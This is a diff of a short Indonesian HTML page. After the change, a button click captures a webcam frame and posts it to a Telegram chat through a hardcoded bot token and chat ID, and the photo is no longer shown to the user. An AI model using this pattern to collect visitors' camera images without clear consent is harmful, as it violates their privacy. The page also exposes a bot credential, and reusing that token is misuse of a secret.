@@ -1,25 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ambil Foto</title>
+  <title>Ambil Foto dan Kirim ke Telegram</title>
 </head>
 <body>
-  <h1>Ambil Foto</h1>
+  <h1>Ambil Foto dan Kirim ke Telegram</h1>
   <video id="video" width="640" height="480" autoplay></video>
   <button id="capture-btn">Ambil Foto</button>
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
   <script>
-    // Mendapatkan elemen video
     var video = document.getElementById('video');
 
-    // Mengonfigurasi constraints untuk kamera
     var constraints = { video: true };
 
-    // Akses kamera pengguna
     navigator.mediaDevices.getUserMedia(constraints)
       .then(function(mediaStream) {
-        // Menampilkan tampilan pratinjau kamera pada elemen video
         video.srcObject = mediaStream;
         video.onloadedmetadata = function(e) {
           video.play();
@@ -29,32 +25,51 @@
         console.error(err);
       });
 
-    // Mendapatkan elemen tombol ambil foto
     var captureButton = document.getElementById('capture-btn');
 
-    // Menangani klik tombol ambil foto
     captureButton.onclick = function() {
-      // Mendapatkan elemen canvas
       var canvas = document.getElementById('canvas');
-
-      // Mengambil konteks 2D dari canvas
       var context = canvas.getContext('2d');
 
-      // Mengatur ukuran canvas sesuai dengan video
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      // Menggambar frame video ke dalam canvas
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Mengambil data gambar dari canvas sebagai URL
       var imageDataURL = canvas.toDataURL('image/png');
 
-      // Tampilkan gambar yang diambil
-      var image = new Image();
-      image.src = imageDataURL;
-      document.body.appendChild(image);
+      // Mengirim foto ke Telegram API
+      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+      var chatId = '1121369247';
+
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+      var formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', dataURItoBlob(imageDataURL));
+
+      fetch(url, {
+        method: 'POST',
+        body: formData
+      })
+      .then(function(response) {
+        console.log('Foto berhasil dikirim ke Telegram.');
+      })
+      .catch(function(error) {
+        console.error('Terjadi kesalahan dalam mengirim foto ke Telegram:', error);
+      });
     };
+
+    // Fungsi untuk mengonversi data URI menjadi Blob
+    function dataURItoBlob(dataURI) {
+      var byteString = atob(dataURI.split(',')[1]);
+      var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      var ab = new ArrayBuffer(byteString.length);
+      var ia = new Uint8Array(ab);
+      for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
   </script>
 </body>
 </html>
